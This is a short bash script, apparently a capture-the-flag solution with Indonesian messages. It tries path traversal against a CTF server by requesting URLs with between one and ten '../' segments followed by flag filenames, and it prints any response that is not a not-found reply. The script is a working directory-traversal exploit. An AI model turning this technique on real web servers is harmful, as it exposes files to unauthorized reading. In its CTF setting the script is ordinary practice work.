#!/bin/bash

TARGET="http://ctf.find-it.id:6001"
FILENAMES=("flag" "flag.txt" "FLAG" "FLAG.txt")
MAX_DEPTH=10

echo "[*] Mencoba path traversal hingga kedalaman $MAX_DEPTH..."

for DEPTH in $(seq 1 $MAX_DEPTH); do
  PAD=$(printf '../%.0s' $(seq 1 $DEPTH))
  for FILE in "${FILENAMES[@]}"; do
    URL="$TARGET/$PAD$FILE"
    echo "[*] Mencoba $URL"
    RESP=$(curl -s "$URL")
    
    # Cek jika respon bukan "Resource not found."
    if [[ "$RESP" != "Resource not found."* ]]; then
      echo ""
      echo "[+] Berhasil! Path: $URL"
      echo "[+] Isi:"
      echo "$RESP"
      exit 0
    fi
  done
done

echo "[-] Gagal menemukan flag hingga kedalaman $MAX_DEPTH"
